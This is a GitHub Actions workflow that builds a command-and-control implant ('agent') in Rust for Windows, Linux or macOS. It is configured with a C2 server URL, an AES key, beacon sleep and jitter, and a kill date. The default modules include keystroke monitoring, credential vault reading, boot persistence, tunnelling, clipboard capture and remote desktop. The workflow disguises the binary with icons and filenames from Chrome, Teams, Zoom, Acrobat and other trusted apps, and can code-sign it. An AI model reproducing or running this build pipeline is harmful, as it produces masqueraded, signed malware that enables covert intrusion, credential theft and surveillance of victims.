name: Build Agent

on:
  workflow_dispatch:
    inputs:
      server_url:
        description: 'C2 server URL'
        required: true
        type: string
      aes_key:
        description: 'AES-256 key (hex)'
        required: true
        type: string
      sleep_seconds:
        description: 'Beacon sleep interval'
        required: true
        default: '5'
        type: string
      jitter_percent:
        description: 'Sleep jitter percentage'
        required: true
        default: '20'
        type: string
      kill_date:
        description: 'Kill date (unix timestamp, 0=disabled)'
        default: '0'
        type: string
      work_hours:
        description: 'Working hours (e.g. 8-18 or empty for always)'
        default: ''
        type: string
      target_os:
        description: 'Target OS'
        required: true
        default: 'windows'
        type: choice
        options:
          - windows
          - linux
          - macos
      modules:
        description: 'Comma-separated module features to enable'
        required: true
        default: 'terminal,storage,task_viewer,display,input_monitor,vault_reader,config_store,boot_entries,service_manager,tunnel,package_loader,cleanup,network_scan,clipboard,remote_desktop'
        type: string
      output_format:
        description: 'Output format'
        required: true
        default: 'exe'
        type: choice
        options:
          - exe
          - dll
      sign_binary:
        description: 'Sign with Azure Trusted Signing'
        required: false
        default: 'false'
        type: boolean
      build_id:
        description: 'Build ID for tracking'
        required: true
        type: string
      disguise:
        description: 'App disguise profile (none, chrome, edge, teams, etc.)'
        required: false
        default: 'none'
        type: string

jobs:
  build:
    runs-on: ${{ inputs.target_os == 'windows' && 'windows-latest' || inputs.target_os == 'macos' && 'macos-latest' || 'ubuntu-latest' }}
    steps:
      - uses: actions/checkout@v4

      - name: Setup Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: |
            x86_64-pc-windows-msvc
            x86_64-unknown-linux-gnu
            x86_64-apple-darwin

      - name: Determine target triple
        id: target
        shell: bash
        run: |
          OS="${{ inputs.target_os }}"
          if [ "$OS" = "windows" ]; then
            echo "triple=x86_64-pc-windows-msvc" >> $GITHUB_OUTPUT
            echo "ext=.exe" >> $GITHUB_OUTPUT
          elif [ "$OS" = "linux" ]; then
            echo "triple=x86_64-unknown-linux-gnu" >> $GITHUB_OUTPUT
            echo "ext=" >> $GITHUB_OUTPUT
          elif [ "$OS" = "macos" ]; then
            echo "triple=x86_64-apple-darwin" >> $GITHUB_OUTPUT
            echo "ext=" >> $GITHUB_OUTPUT
          fi

      - name: Download disguise icon
        if: inputs.disguise != 'none' && inputs.target_os == 'windows'
        shell: bash
        working-directory: agent
        run: |
          # Map disguise ID to simpleicons slug and brand color
          case "${{ inputs.disguise }}" in
            adobe_acrobat) ICON_SLUG="adobeacrobatreader" COLOR="EC1C24" ;;
            chrome) ICON_SLUG="googlechrome" COLOR="4285F4" ;;
            edge) ICON_SLUG="microsoftedge" COLOR="0078D7" ;;
            teams) ICON_SLUG="microsoftteams" COLOR="6264A7" ;;
            zoom) ICON_SLUG="zoom" COLOR="0B5CFF" ;;
            slack) ICON_SLUG="slack" COLOR="4A154B" ;;
            discord) ICON_SLUG="discord" COLOR="5865F2" ;;
            spotify) ICON_SLUG="spotify" COLOR="1DB954" ;;
            steam) ICON_SLUG="steam" COLOR="000000" ;;
            vlc) ICON_SLUG="vlcmediaplayer" COLOR="FF8800" ;;
            sevenzip) ICON_SLUG="7zip" COLOR="000000" ;;
            notepadpp) ICON_SLUG="notepadplusplus" COLOR="90E59A" ;;
            filezilla) ICON_SLUG="filezilla" COLOR="BF0000" ;;
            onedrive) ICON_SLUG="microsoftonedrive" COLOR="0078D4" ;;
            dropbox) ICON_SLUG="dropbox" COLOR="0061FF" ;;
            nodejs) ICON_SLUG="nodedotjs" COLOR="339933" ;;
            python) ICON_SLUG="python" COLOR="3776AB" ;;
            vscode) ICON_SLUG="visualstudiocode" COLOR="007ACC" ;;
            *) ICON_SLUG="" ;;
          esac

          if [ -n "$ICON_SLUG" ]; then
            # Download SVG from simpleicons CDN
            curl -sL -o app_icon.svg "https://cdn.simpleicons.org/${ICON_SLUG}/${COLOR}" || true

            # Convert SVG to ICO - magick is available on windows-latest runner
            if [ -f app_icon.svg ] && [ -s app_icon.svg ]; then
              magick app_icon.svg -background none -resize 256x256 app_icon.ico 2>/dev/null || \
              convert app_icon.svg -background none -resize 256x256 app_icon.ico 2>/dev/null || true
            fi

            if [ -f app_icon.ico ] && [ -s app_icon.ico ]; then
              ICON_ABS="$(cd "$(dirname app_icon.ico)" && pwd)/app_icon.ico"
              echo "SG_ICON_PATH=${ICON_ABS}" >> $GITHUB_ENV
              echo "Icon downloaded and converted: ${ICON_ABS}"
            else
              echo "Icon conversion failed or empty - building without icon"
            fi
          else
            echo "No icon slug for disguise '${{ inputs.disguise }}' - skipping icon"
          fi

      - name: Build agent
        working-directory: agent
        shell: bash
        env:
          SG_SERVER_URL: ${{ inputs.server_url }}
          SG_AES_KEY: ${{ inputs.aes_key }}
          SG_SLEEP: ${{ inputs.sleep_seconds }}
          SG_JITTER: ${{ inputs.jitter_percent }}
          SG_KILLDATE: ${{ inputs.kill_date }}
          SG_WORK_HOURS: ${{ inputs.work_hours }}
          SG_DISGUISE: ${{ inputs.disguise }}
        run: |
          FEATURES="${{ inputs.modules }}"
          cargo build --release --target ${{ steps.target.outputs.triple }} --no-default-features --features "$FEATURES"

      - name: Rename binary
        shell: bash
        run: |
          SRC="agent/target/${{ steps.target.outputs.triple }}/release/agent${{ steps.target.outputs.ext }}"

          # Use disguise-matched filename if set, otherwise default
          case "${{ inputs.disguise }}" in
            adobe_acrobat) FNAME="AcroRd32" ;;
            chrome) FNAME="chrome" ;;
            edge) FNAME="msedge" ;;
            teams) FNAME="Teams" ;;
            zoom) FNAME="Zoom" ;;
            slack) FNAME="slack" ;;
            discord) FNAME="Discord" ;;
            spotify) FNAME="Spotify" ;;
            steam) FNAME="steam" ;;
            vlc) FNAME="vlc" ;;
            sevenzip) FNAME="7zFM" ;;
            notepadpp) FNAME="notepad++" ;;
            winrar) FNAME="WinRAR" ;;
            filezilla) FNAME="filezilla" ;;
            putty) FNAME="putty" ;;
            onedrive) FNAME="OneDrive" ;;
            dropbox) FNAME="Dropbox" ;;
            nodejs) FNAME="node" ;;
            python) FNAME="python" ;;
            vscode) FNAME="Code" ;;
            *) FNAME="agent-${{ inputs.build_id }}" ;;
          esac

          DST="${FNAME}${{ steps.target.outputs.ext }}"
          cp "$SRC" "$DST"
          echo "BINARY=$DST" >> $GITHUB_ENV

      - name: Sign binary (Azure Trusted Signing)
        if: inputs.sign_binary == true && inputs.target_os == 'windows'
        uses: azure/trusted-signing-action@v0.5.0
        with:
          azure-tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          azure-client-id: ${{ secrets.AZURE_CLIENT_ID }}
          azure-client-secret: ${{ secrets.AZURE_CLIENT_SECRET }}
          endpoint: ${{ secrets.AZURE_SIGNING_ENDPOINT }}
          trusted-signing-account-name: ${{ secrets.AZURE_SIGNING_ACCOUNT }}
          certificate-profile-name: ${{ secrets.AZURE_CERT_PROFILE }}
          files-folder: .
          files-folder-filter: exe

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: agent-${{ inputs.build_id }}
          path: ${{ env.BINARY }}
          retention-days: 7
